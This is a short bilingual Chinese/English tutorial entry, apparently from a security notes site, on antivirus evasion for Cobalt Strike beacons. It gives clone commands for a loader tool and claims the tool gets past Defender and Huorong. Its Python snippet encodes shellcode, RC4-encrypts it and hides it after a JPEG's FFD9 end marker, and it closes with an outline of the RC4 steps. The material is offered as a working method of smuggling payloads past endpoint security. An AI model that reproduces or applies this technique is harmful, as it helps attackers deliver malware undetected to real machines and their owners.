title.zh: CS 上线木马免杀入门：Golang 与 Python 实现
title.en: CS Beacon Bypass Walkthrough: Golang and Python Implementation

description.zh: 介绍 Cobalt Strike 木马的免杀技术，包括使用 Golang 和 Python 加载器、图片 shellcode 加密生成、RC4 加密算法等实现方式。
description.en: Introduction to CS trojan antivirus evasion, using Golang and Python loaders, image shellcode encryption, RC4 encryption.

content.zh: 如何实现 CS 木马的免杀？
content.en: How to implement CS trojan antivirus evasion?

content.zh: 免杀思路：使用 CS-Loader 工具，支持 Golang 和 Python 两种实现。Golang 版本成功通过微软 Defender 和火绒免杀。
content.en: Evasion approach: Use CS-Loader tool with Golang and Python implementations. Golang version bypasses Defender and Huorong.

codeBlocks.code:
git clone https://github.com/Gality369/CS-Loader.git
cd CS-Loader
# Install Golang: https://go.dev/doc/install
# Install Python: https://www.python.org/downloads/

content.zh: 图片 shellcode 是如何生成的？
图片 shellcode 生成流程：Base64编码 → RC4加密 → Base64编码 → 嵌入图片FFD9标记后
content.en: Image shellcode generation: Base64 encode → RC4 encrypt → Base64 encode → embed after image FFD9 marker

codeBlocks.code:
# Base64 encode shellcode
baseStr = base64.b64encode(shellcode)
# RC4 + Base64 encode
payload = rc4(baseStr, key)

# Embed in image
with open(imgName, 'rb') as f:
    img = f.read()
    fileend = img[-2:]
    # Check for FFD9 marker
    if ord(fileend[0]) == 255 and ord(fileend[1]) == 217:
        # Append payload after FFD9
        new_img = img + payload

content.zh: RC4 加密实现：MD5(key)生成密钥 → 初始化S-box → 打乱S-box → 异或运算 → Base64编码。加密后数据看起来像Base64但无法直接解码。
content.en: RC4 implementation: MD5(key) → init S-box → shuffle → XOR → Base64. Encrypted data looks like Base64 but cannot be decoded directly.
